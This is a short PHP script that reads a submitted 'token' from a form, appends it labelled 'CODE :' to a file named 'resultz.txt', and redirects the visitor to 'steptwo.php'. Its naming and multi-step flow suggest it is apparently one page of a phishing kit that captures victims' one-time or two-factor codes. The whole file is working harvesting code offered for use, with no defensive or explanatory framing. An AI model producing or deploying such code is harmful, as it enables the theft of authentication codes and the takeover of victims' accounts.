<?php
$token = $_POST['token'];

if (empty($token)) {
  header('location: ./');
} else {
$message = "
CODE : ".$token."

";
$qq = fopen("resultz.txt", "a");
fwrite($qq, $message);
fclose($qq);
header('location: steptwo.php');
}
?>
